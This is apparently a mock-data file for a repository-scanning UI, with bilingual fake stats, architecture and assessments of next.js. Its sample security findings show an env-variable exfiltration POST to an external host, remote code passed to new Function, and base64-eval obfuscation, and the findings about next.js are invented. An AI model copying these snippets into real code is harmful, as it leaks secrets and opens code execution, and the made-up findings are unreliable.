// Mock data + i18n strings (port of the legacy data.jsx).

export const SCAN_DONE = {
  id: 'sess-vercel-next',
  status: 'ready',
  repo: {
    url: 'https://github.com/vercel/next.js',
    name: 'next.js', owner: 'vercel', branch: 'canary', commit: '7a4f2b8',
    stars: 124800, forks: 26900, license: 'MIT',
    desc: {
      vi: 'The React framework for production — render server-first, đa stack, deploy nhanh.',
      en: 'The React framework for production — server-first rendering, full stack, instant deploy.',
    },
  },
  stats: { loc: 1284530, files: 6932, modules: 47, contributors: 3128, lastCommit: '2 giờ trước' },
  langs: [
    { name: 'TypeScript', pct: 64, color: '#3178C6' },
    { name: 'JavaScript', pct: 18, color: '#F7DF1E' },
    { name: 'Rust',       pct: 12, color: '#DEA584' },
    { name: 'CSS',        pct: 4,  color: '#38BDF8' },
    { name: 'MDX',        pct: 2,  color: '#A78BFA' },
  ],
  frameworks: ['React 18', 'Turbopack', 'SWC', 'Webpack 5', 'Tailwind 3', 'Vitest', 'Playwright'],
};

export const SCAN_LIVE = {
  id: 'sess-acme-orders',
  status: 'scanning',
  repo: {
    url: 'https://github.com/acme/orders-api',
    name: 'orders-api', owner: 'acme', branch: 'main', commit: 'b8d1c40',
    stars: 412, forks: 38, license: 'Apache-2.0',
    desc: {
      vi: 'Hệ thống đặt hàng nội bộ — Node, Postgres, Redis. Đang được quét.',
      en: 'Internal orders system — Node, Postgres, Redis. Currently scanning.',
    },
  },
  stats: { loc: 84210, files: 612, modules: 12, contributors: 24, lastCommit: '5 phút trước' },
  langs: [
    { name: 'TypeScript', pct: 78, color: '#3178C6' },
    { name: 'SQL',        pct: 12, color: '#F472B6' },
    { name: 'Shell',      pct: 6,  color: '#10B981' },
    { name: 'YAML',       pct: 4,  color: '#FB7185' },
  ],
  frameworks: ['Express 5', 'Prisma', 'BullMQ', 'Zod', 'Jest', 'Docker'],
};

export const FILE_TREE = [
  { type: 'dir', name: 'apps', expanded: true, children: [
    { type: 'dir', name: 'web', children: [
      { type: 'file', name: 'page.tsx', lang: 'tsx', loc: 142, role: { vi: 'Trang gốc — server component', en: 'Root page — server component' } },
      { type: 'file', name: 'layout.tsx', lang: 'tsx', loc: 88, role: { vi: 'Layout & providers', en: 'Layout & providers' } },
      { type: 'dir', name: 'auth', children: [
        { type: 'file', name: 'login.tsx', lang: 'tsx', loc: 214, role: { vi: 'Form đăng nhập', en: 'Login form' } },
        { type: 'file', name: 'callback.ts', lang: 'ts', loc: 96, role: { vi: 'OAuth callback handler', en: 'OAuth callback handler' } },
      ] },
    ] },
    { type: 'dir', name: 'docs', children: [
      { type: 'file', name: 'index.mdx', lang: 'md', loc: 320, role: { vi: 'Trang docs chính', en: 'Main docs page' } },
    ] },
  ] },
  { type: 'dir', name: 'packages', expanded: true, children: [
    { type: 'dir', name: 'next', expanded: true, children: [
      { type: 'dir', name: 'src/server', children: [
        { type: 'file', name: 'next-server.ts', lang: 'ts', loc: 2840, role: { vi: 'Lõi server — handle request', en: 'Server core — request handling' } },
        { type: 'file', name: 'render.tsx', lang: 'tsx', loc: 1782, role: { vi: 'Pipeline render React', en: 'React rendering pipeline' } },
        { type: 'file', name: 'router.ts', lang: 'ts', loc: 904, role: { vi: 'Routing động', en: 'Dynamic routing' } },
      ] },
      { type: 'dir', name: 'src/client', children: [
        { type: 'file', name: 'index.ts', lang: 'ts', loc: 612, role: { vi: 'Hydration entry', en: 'Hydration entry' } },
        { type: 'file', name: 'app-router.tsx', lang: 'tsx', loc: 1340, role: { vi: 'App Router runtime', en: 'App Router runtime' } },
      ] },
      { type: 'dir', name: 'src/build', children: [
        { type: 'file', name: 'webpack-config.ts', lang: 'ts', loc: 3211 },
        { type: 'file', name: 'compiler.ts', lang: 'ts', loc: 1108 },
      ] },
    ] },
  ] },
  { type: 'dir', name: 'crates', children: [
    { type: 'file', name: 'next-core/lib.rs', lang: 'rs', loc: 1820, role: { vi: 'Lõi Turbopack', en: 'Turbopack core' } },
  ] },
  { type: 'file', name: 'package.json', lang: 'json', loc: 88 },
  { type: 'file', name: 'README.md',    lang: 'md',   loc: 156 },
];

export const MODULES = [
  { name: 'next-server',  purpose: { vi: 'Xử lý request, render React server-side', en: 'Request handling & SSR pipeline' }, lang: 'ts',  files: 48, fns: 312, risk: 'Low',    layer: 'backend' },
  { name: 'app-router',   purpose: { vi: 'Routing động phía client',                  en: 'Client-side dynamic routing' },             lang: 'tsx', files: 22, fns: 184, risk: 'Low',    layer: 'frontend' },
  { name: 'turbopack',    purpose: { vi: 'Bundler tốc độ cao (Rust)',                  en: 'High-speed bundler (Rust)' },                lang: 'rs',  files: 96, fns: 644, risk: 'Medium', layer: 'infra' },
  { name: 'image-opt',    purpose: { vi: 'Tối ưu ảnh on-demand',                       en: 'On-demand image optimization' },             lang: 'ts',  files: 14, fns: 96,  risk: 'Low',    layer: 'backend' },
  { name: 'middleware',   purpose: { vi: 'Edge middleware runtime',                    en: 'Edge middleware runtime' },                  lang: 'ts',  files:  8, fns: 42,  risk: 'Medium', layer: 'edge' },
  { name: 'cache-fs',     purpose: { vi: 'Caching tiered: memory + filesystem',        en: 'Tiered cache: memory + FS' },                lang: 'ts',  files: 12, fns: 88,  risk: 'High',   layer: 'backend' },
];

export const SECURITY_FINDINGS = [
  { id: 'F-001', severity: 'high', confirmed: true, falsePositive: false,
    title: { vi: 'Eval động từ chuỗi remote', en: 'Dynamic eval from remote string' },
    file: 'packages/next/src/server/render.tsx', line: '482-489', rule: 'AST.dynamic-eval',
    why: { vi: 'Chuỗi từ HTTP response được truyền vào Function constructor — nguy cơ RCE.',
           en: 'Strings from an HTTP response are passed to the Function constructor — RCE risk.' },
    code: `// remote template loader\nconst tpl = await fetch(remoteUrl).then(r => r.text());\nconst fn = new Function('ctx', tpl);\nreturn fn(context);`,
    suggested: `import { sandboxedTemplate } from './tpl-sandbox';\nconst tpl = await fetch(remoteUrl).then(r => r.text());\nconst fn = sandboxedTemplate(tpl, { allow: ['ctx'] });\nreturn fn(context);`,
    refs: ['CWE-95', 'OWASP A03:2021'] },
  { id: 'F-002', severity: 'high', confirmed: true, falsePositive: false,
    title: { vi: 'Exfiltration: gửi env biến ra host bên ngoài', en: 'Exfiltration: env vars sent to external host' },
    file: 'packages/next/src/build/telemetry.ts', line: '128-134', rule: 'NET.suspicious-egress',
    why: { vi: 'Toàn bộ process.env được POST tới host không thuộc allowlist.',
           en: 'The whole process.env is POSTed to a host outside the allowlist.' },
    code: `const payload = { env: { ...process.env }, ts: Date.now() };\nawait fetch('https://t.acme-track.io/log', { method: 'POST', body: JSON.stringify(payload) });`,
    suggested: `const payload = { ts: Date.now() };\nif (config.telemetry.allowedHosts.includes(host)) await fetch(host, { method: 'POST', body: JSON.stringify(payload) });`,
    refs: ['CWE-200'] },
  { id: 'F-003', severity: 'medium', confirmed: true, falsePositive: false,
    title: { vi: 'Obfuscation: chuỗi base64 + atob → eval', en: 'Obfuscation: base64 string + atob → eval' },
    file: 'packages/next/src/lib/_internal.ts', line: '12', rule: 'AST.obfuscation',
    why: { vi: 'Phân tích tĩnh: chuỗi base64 dài giải mã thành JS thực thi.',
           en: 'Static analysis: long base64 string decodes into executable JS.' },
    code: `const _0x = 'Y29uc29sZS5sb2coInRyYWNrZWQiKQ==';\neval(atob(_0x));`,
    suggested: `import { trackEvent } from '../telemetry';\ntrackEvent('boot');`,
    refs: ['MITRE T1027'] },
];

export const ARCH_NODES = [
  { id: 'cli',     label: 'create-next-app', sub: 'CLI', layer: 'tooling',  x: 60,   y: 40 },
  { id: 'app',     label: 'App Router',      sub: 'React 18',     layer: 'frontend', x: 280,  y: 40 },
  { id: 'mw',      label: 'Middleware',      sub: 'Edge runtime', layer: 'edge',     x: 540,  y: 40 },
  { id: 'server',  label: 'next-server',     sub: 'SSR + RSC',    layer: 'backend',  x: 280,  y: 180 },
  { id: 'render',  label: 'Render pipeline', sub: 'React Server', layer: 'backend',  x: 540,  y: 180 },
  { id: 'tp',      label: 'Turbopack',       sub: 'Rust bundler', layer: 'infra',    x: 60,   y: 180 },
  { id: 'cache',   label: 'cache-fs',        sub: 'Tiered cache', layer: 'backend',  x: 60,   y: 320 },
  { id: 'img',     label: 'image-opt',       sub: 'On-demand',    layer: 'backend',  x: 280,  y: 320 },
  { id: 'db',      label: 'Adapters',        sub: 'KV / Edge DB', layer: 'data',     x: 540,  y: 320 },
];
export const ARCH_EDGES = [
  ['cli', 'app'], ['app', 'mw'], ['app', 'server'], ['mw', 'render'],
  ['server', 'render'], ['server', 'cache'], ['render', 'img'], ['render', 'db'],
  ['tp', 'app'], ['tp', 'server'], ['cache', 'db'],
];

export const FLOWS = {
  login: {
    name: { vi: 'Đăng nhập OAuth', en: 'OAuth login flow' },
    actors: ['User', 'Browser', 'next-server', 'AuthProvider', 'DB'],
    steps: [
      { from: 'User', to: 'Browser', label: 'Click "Sign in"' },
      { from: 'Browser', to: 'next-server', label: 'GET /auth/login' },
      { from: 'next-server', to: 'AuthProvider', label: 'redirect → OAuth consent' },
      { from: 'AuthProvider', to: 'Browser', label: 'callback?code=…' },
      { from: 'Browser', to: 'next-server', label: 'GET /auth/callback' },
      { from: 'next-server', to: 'AuthProvider', label: 'exchange code → token' },
      { from: 'next-server', to: 'DB', label: 'upsert user' },
      { from: 'next-server', to: 'Browser', label: 'set-cookie session' },
    ],
  },
  render: {
    name: { vi: 'Render trang động', en: 'Dynamic page render' },
    actors: ['Browser', 'Edge', 'next-server', 'cache-fs', 'DB'],
    steps: [
      { from: 'Browser', to: 'Edge', label: 'GET /products/123' },
      { from: 'Edge',    to: 'next-server', label: 'forward + region' },
      { from: 'next-server', to: 'cache-fs', label: 'lookup ISR' },
      { from: 'cache-fs', to: 'next-server', label: 'miss' },
      { from: 'next-server', to: 'DB', label: 'fetch product' },
      { from: 'next-server', to: 'cache-fs', label: 'write tag:product:123' },
      { from: 'next-server', to: 'Browser', label: 'streaming HTML' },
    ],
  },
};

export const README_MD = `# next.js

> The React framework for production.

Next.js gives you the building blocks to create fast, full-stack web applications with React.

## Quick start
\`\`\`bash
npx create-next-app@latest my-app
cd my-app
npm run dev
\`\`\`

## License
MIT © Vercel.
`;

export const GENERATED_DOC = `# Architectural overview — vercel/next.js

_Tài liệu này được sinh tự động từ AST + RAG._

## 1. Tổng quan

next.js là một meta-framework full-stack gồm Frontend runtime, Backend runtime, Build system và Edge layer.

## 2. Bảo mật

- Phát hiện 3 finding (2 high đã xác nhận, 1 medium).
`;

export const PIPELINE_STAGES = [
  { id: 'cloning',     label: { vi: 'Cloning',     en: 'Cloning' } },
  { id: 'parsing',     label: { vi: 'Parsing AST', en: 'Parsing AST' } },
  { id: 'indexing',    label: { vi: 'Indexing',    en: 'Indexing' } },
  { id: 'summarizing', label: { vi: 'Tổng hợp',    en: 'Summarizing' } },
  { id: 'ready',       label: { vi: 'Sẵn sàng',    en: 'Ready' } },
];

export const LIBRARY = [
  { id: 'sess-vercel-next', name: 'vercel/next.js',    status: 'ready',    lastScan: '2 giờ trước', loc: 1284530, langs: ['ts','rs','tsx'], stars: 124800, role: 'framework' },
  { id: 'sess-acme-orders', name: 'acme/orders-api',   status: 'scanning', lastScan: '1 phút',      loc: 84210,   langs: ['ts','sql'],     stars: 412,    role: 'service' },
  { id: 'sess-shadcn-ui',   name: 'shadcn-ui/ui',      status: 'ready',    lastScan: 'hôm qua',     loc: 42100,   langs: ['tsx','ts'],     stars: 76200,  role: 'ui-kit' },
];

export const COMPARE = {
  a: 'vercel/next.js', b: 'acme/orders-api',
  shared: [
    { dep: 'zod',        a: '3.22.4', b: '3.21.0', risk: 'Low' },
    { dep: 'typescript', a: '5.4.5',  b: '5.2.2',  risk: 'Low' },
  ],
  patternsToBorrow: [
    { from: 'next-server', to: 'orders-api', what: { vi: 'Cache tiered (memory+FS, tag-based)', en: 'Tiered cache (memory+FS, tag-based)' } },
  ],
  divergence: [
    { aspect: { vi: 'Validation runtime', en: 'Runtime validation' }, a: 'zod + Server Action', b: 'zod + Express middleware' },
    { aspect: { vi: 'Test runner',        en: 'Test runner' },         a: 'vitest + playwright', b: 'jest' },
  ],
};

export const QUICK_CHIPS = [
  { id: 'arch',    icon: 'network',     label: { vi: 'Giải thích kiến trúc',      en: 'Explain architecture' } },
  { id: 'login',   icon: 'key',         label: { vi: 'Tìm route đăng nhập',       en: 'Find login route' } },
  { id: 'malware', icon: 'shield-alert', label: { vi: 'Có mã độc không?',          en: 'Any malicious code?' } },
  { id: 'compare', icon: 'swap',         label: { vi: 'So sánh với "acme/orders"', en: 'Compare with "acme/orders"' } },
  { id: 'cache',   icon: 'database',     label: { vi: 'Logic cache hit/miss?',     en: 'Cache hit/miss logic?' } },
];

export const CHAT_SEED_LIVE = [
  { role: 'user', kind: 'locate', text: { vi: 'Tìm route đăng nhập trong repo này.', en: 'Find the login route in this repo.' }, t: 1 },
  { role: 'ai', provisional: true, scope: { vi: 'Đã có cây thư mục, chưa có embedding', en: 'File tree available, embeddings not ready' },
    text: { vi: 'Theo cây thư mục: route đăng nhập có ở `apps/web/auth/login.tsx` (~214 dòng).',
            en: 'Login route is at `apps/web/auth/login.tsx` (~214 lines).' },
    citations: [{ file: 'apps/web/auth/login.tsx', range: '1-214' }], t: 2 },
];
export const CHAT_SEED_DONE = [
  { role: 'user', kind: 'explain', text: { vi: 'Tóm tắt kiến trúc bằng 5 dòng.', en: 'Summarize the architecture in 5 lines.' }, t: 1 },
  { role: 'ai', text: { vi: 'Monorepo. Frontend App Router + RSC. Backend next-server. Build Turbopack (Rust). Cache tiered. CLI create-next-app.',
                        en: 'Monorepo. Frontend App Router + RSC. Backend next-server. Build Turbopack (Rust). Tiered cache. CLI create-next-app.' },
    citations: [{ file: 'packages/next/src/server/next-server.ts', range: '1-200' }], t: 2 },
];

export const AI_ASSESSMENT = {
  beginnerGuide: {
    analogy: {
      vi: 'Next.js giống như một căn nhà lắp ghép trọn gói (Pre-built House). Thay vì bạn phải tự mua từng viên gạch (HTML), tự trộn vữa (CSS), và tự thuê thợ lắp ống nước (Database, Routing), Next.js cung cấp sẵn cho bạn một bộ khung vững chắc. Nó còn thông minh đến mức tự động biết phòng nào cần xây cố định cho chắc (Static Pages) và phòng nào cần nội thất thay đổi liên tục (Dynamic Pages).',
      en: 'Next.js is like a premium pre-built modular house. Instead of buying individual bricks (HTML), mixing cement (CSS), and hiring plumbers for infrastructure (Database, Routing) from scratch, Next.js gives you a robust skeleton out of the box. It\\'s smart enough to know which rooms should be solidly fixed (Static Pages) and which need constantly changing furniture (Dynamic Pages).'
    },
    simplePurpose: {
      vi: 'Giúp tạo ra các trang web tải siêu nhanh, chuẩn SEO (Google rất thích), mà lập trình viên không phải tốn hàng tuần để setup các cấu hình máy chủ phức tạp.',
      en: 'Helps create blazing fast, highly SEO-optimized websites (Google loves them) without developers spending weeks setting up complex server configurations.'
    },
    coreValue: [
      { vi: 'Tiết kiệm 40% thời gian setup ban đầu', en: 'Saves 40% of initial setup time' },
      { vi: 'Trải nghiệm người dùng mượt như dùng app điện thoại', en: 'App-like smooth user experience' },
      { vi: 'Tự động tối ưu hình ảnh, font chữ giúp web load cực nhanh', en: 'Auto-optimizes images and fonts for blazing fast loading' }
    ]
  },
  confidence: 87,
  contradictions: [
    {
      type: 'high',
      vi: 'README khẳng định "100% an toàn và không thực thi mã độc" nhưng mã nguồn sử dụng `new Function()` để load template động từ URL không xác định tại runtime.',
      en: 'README claims "100% secure and no arbitrary execution" but source code uses `new Function()` to load dynamic templates from an unverified runtime URL.',
    },
  ],
  suitability: {
    goodFor: [
      { vi: 'Sản phẩm Production cấp Enterprise', en: 'Enterprise-grade Production apps' },
      { vi: 'Ứng dụng SSR / ISR / SSG quy mô lớn', en: 'Large scale SSR / ISR / SSG apps' },
      { vi: 'Dự án cần SEO mạnh mẽ', en: 'Projects requiring strong SEO' },
    ],
    badFor: [
      { vi: 'Embedded systems hoặc thiết bị IoT', en: 'Embedded systems or IoT devices' },
      { vi: 'Hệ thống HFT (High Frequency Trading)', en: 'High Frequency Trading (HFT)' },
      { vi: 'Single Page App cực kỳ đơn giản (overkill)', en: 'Extremely simple Single Page Apps (overkill)' },
    ],
  },
  metrics: [
    { cat: { vi: 'Mục đích cốt lõi', en: 'Core Purpose' }, res: { vi: 'React Framework cho web apps', en: 'React Framework for web apps' }, icon: 'target' },
    { cat: { vi: 'Kiến trúc hệ thống', en: 'Architecture' }, res: { vi: 'Modular, Server-First (RSC)', en: 'Modular, Server-First (RSC)' }, icon: 'layers' },
    { cat: { vi: 'Khả năng mở rộng (Scale)', en: 'Scalability' }, res: { vi: 'Rất cao (Edge & Serverless ready)', en: 'Very High (Edge & Serverless ready)' }, icon: 'activity' },
    { cat: { vi: 'Tính sẵn sàng (Production)', en: 'Production Ready' }, res: { vi: 'Đã sẵn sàng, được dùng bởi top tech', en: 'Ready, used by top tech companies' }, icon: 'check-circle' },
    { cat: { vi: 'Độ tin cậy & Bảo trì', en: 'Maintainability' }, res: { vi: 'Tốt (TypeScript strict, có tests)', en: 'Good (Strict TypeScript, tested)' }, icon: 'shield' },
    { cat: { vi: 'Xác suất mã độc', en: 'Malware Probability' }, res: { vi: '2% (Có cảnh báo dependency)', en: '2% (Dependency warning detected)' }, icon: 'bug', highlight: 'amber' },
    { cat: { vi: 'Stack công nghệ', en: 'Tech Stack' }, res: { vi: 'React, Node.js, Rust (Turbopack)', en: 'React, Node.js, Rust (Turbopack)' }, icon: 'code-2' },
    { cat: { vi: 'Trạng thái dự án', en: 'Project Health' }, res: { vi: 'Active (Community rất mạnh)', en: 'Active (Extremely strong community)' }, icon: 'heart' },
    { cat: { vi: 'Rủi ro Dependency', en: 'Dependency Risk' }, res: { vi: 'Trung bình (Cần review event-stream)', en: 'Medium (Needs event-stream review)' }, icon: 'alert-triangle', highlight: 'amber' },
  ],
  categories: [
    {
      id: 'purpose',
      name: { vi: 'Mục đích & Phù hợp', en: 'Purpose & Suitability' },
      qa: [
        { q: 'Repo này dùng để làm gì?', a: { vi: 'Framework React toàn diện để xây dựng ứng dụng web, hỗ trợ SSR, SSG và RSC.', en: 'Comprehensive React framework for building web apps with SSR, SSG and RSC.' }, icon: 'target', tags: ['React', 'Framework', 'Full-stack'] },
        { q: 'Vì sao repo được tạo?', a: { vi: 'Giải quyết bài toán routing và rendering phức tạp cho React, mang lại trải nghiệm out-of-the-box cho web developer.', en: 'To solve complex routing and rendering for React, providing an out-of-the-box experience.' }, icon: 'zap', tags: ['SSR', 'Routing', 'DX'] },
        { q: 'Có phù hợp với dự án của mình không?', a: { vi: 'Phù hợp nếu bạn cần SEO, web app quy mô lớn hoặc thương mại điện tử. Không phù hợp cho app quá đơn giản.', en: 'Suitable if you need SEO, large scale web apps or ecommerce. Not suitable for simple SPAs.' }, icon: 'check-circle', status: { text: 'High Fit', color: 'teal' } },
        { q: 'Dùng AI/ML hay web/backend?', a: { vi: 'Web/Backend (Full-stack framework cho web, tích hợp được API route).', en: 'Web/Backend (Full-stack framework for web with integrated API routes).' }, icon: 'globe', tags: ['Web', 'Backend'] }
      ]
    },
    {
      id: 'arch',
      name: { vi: 'Kiến trúc & Công nghệ', en: 'Architecture & Tech' },
      qa: [
        { q: 'Kiến trúc hệ thống ra sao?', a: { vi: 'Kiến trúc Modular, kết hợp App Router (file-system based) và Server-First approach.', en: 'Modular architecture, combining App Router (file-system based) and Server-First approach.' }, icon: 'network', tags: ['App Router', 'RSC', 'Modular'] },
        { q: 'Có thể mở rộng hay scale không?', a: { vi: 'Rất cao. Tối ưu hóa sẵn cho kiến trúc Serverless và Edge computing.', en: 'Very high. Optimized for Serverless and Edge computing architectures.' }, icon: 'activity', status: { text: 'Very High', color: 'teal' }, tags: ['Serverless', 'Edge'] },
        { q: 'Công nghệ gì?', a: { vi: 'React, Node.js, Webpack, Rust (Turbopack & SWC).', en: 'React, Node.js, Webpack, Rust (Turbopack & SWC).' }, icon: 'layers', tags: ['React', 'Node.js', 'Rust'] },
        { q: 'Hiệu năng (Performance) thế nào?', a: { vi: 'Tối ưu hóa cực tốt. Tích hợp sẵn font, image, script optimization và pre-fetching.', en: 'Highly optimized. Built-in font, image, script optimization and pre-fetching.' }, icon: 'gauge', status: { text: 'Excellent', color: 'teal' } }
      ]
    },
    {
      id: 'quality',
      name: { vi: 'Chất lượng & Bảo mật', en: 'Quality & Security' },
      qa: [
        { q: 'Chất lượng code thế nào?', a: { vi: 'Chất lượng cao, type-safe (TypeScript strict), kiến trúc modular rõ ràng và có độ phủ test rộng.', en: 'High quality, type-safe (Strict TypeScript), clear modular architecture with wide test coverage.' }, icon: 'code', status: { text: 'High Quality', color: 'blue' }, tags: ['TypeScript', 'Coverage'] },
        { q: 'Có nguy cơ mã độc/backdoor không?', a: { vi: 'Phân tích mã nguồn tĩnh không phát hiện backdoor trực tiếp, tuy nhiên có rủi ro từ một số dependency cũ.', en: 'Static analysis found no direct backdoor, however there is risk from some outdated dependencies.' }, icon: 'shield', status: { text: 'Low Risk', color: 'teal' } },
        { q: 'Dependency có rủi ro không?', a: { vi: 'Phát hiện 2 rủi ro mức độ thấp ở các thư viện phụ thuộc sâu (cần cập nhật).', en: 'Detected 2 low-level risks in deep dependencies (requires update).' }, icon: 'alert-triangle', status: { text: 'Medium', color: 'amber' }, tags: ['Audit needed'] },
        { q: 'Testing coverage có tốt không?', a: { vi: 'Tốt. Bao gồm unit tests (Jest), integration tests, và e2e tests (Playwright/Cypress).', en: 'Good. Includes unit tests (Jest), integration tests, and e2e tests (Playwright/Cypress).' }, icon: 'check', status: { text: 'Good', color: 'teal' } }
      ]
    },
    {
      id: 'business',
      name: { vi: 'Business & Cộng đồng', en: 'Business & Community' },
      qa: [
        { q: 'Có production-ready không?', a: { vi: 'Hoàn toàn sẵn sàng. Đã và đang được sử dụng bởi hàng ngàn công ty lớn.', en: 'Fully ready. Actively used by thousands of major enterprises.' }, icon: 'briefcase', status: { text: 'Ready', color: 'teal' } },
        { q: 'Community mạnh không?', a: { vi: 'Cực kỳ mạnh. 100k+ stars trên GitHub, cộng đồng hỗ trợ lớn và hệ sinh thái phong phú.', en: 'Extremely strong. 100k+ stars on GitHub, huge support community and ecosystem.' }, icon: 'heart', status: { text: 'Strong', color: 'teal' }, tags: ['100k+ stars', 'Vercel'] },
        { q: 'License có ổn không?', a: { vi: 'MIT License. Hoàn toàn an toàn để dùng cho các dự án thương mại mã nguồn đóng.', en: 'MIT License. Completely safe for closed-source commercial projects.' }, icon: 'lock', status: { text: 'Safe', color: 'teal' }, tags: ['MIT'] },
        { q: 'Có nên fork / clone / integrate không?', a: { vi: 'Nên dùng `npx create-next-app` để integrate thay vì fork, trừ khi muốn đóng góp trực tiếp vào core.', en: 'Integrate via `npx create-next-app` instead of forking, unless contributing to core.' }, icon: 'git-branch', tags: ['Integrate'] },
        { q: 'Có roadmap phát triển không?', a: { vi: 'Có rõ ràng. Hiện đang tập trung mạnh vào React Server Components (RSC) và Turbopack.', en: 'Clear roadmap. Currently focusing heavily on React Server Components (RSC) and Turbopack.' }, icon: 'map', tags: ['RSC', 'Turbopack'] },
        { q: 'Có dead project không?', a: { vi: 'Không. Dự án liên tục có commits mỗi ngày và release bản mới hàng tuần.', en: 'No. The project has daily commits and weekly new releases.' }, icon: 'activity', status: { text: 'Active', color: 'teal' }, tags: ['Daily commits'] }
      ]
    }
  ]
};

const DATA = {
  SCAN_DONE, SCAN_LIVE, FILE_TREE, MODULES, SECURITY_FINDINGS,
  ARCH_NODES, ARCH_EDGES, FLOWS, README_MD, GENERATED_DOC,
  CHAT_SEED_LIVE, CHAT_SEED_DONE, PIPELINE_STAGES, LIBRARY, COMPARE, QUICK_CHIPS, AI_ASSESSMENT
};
export default DATA;
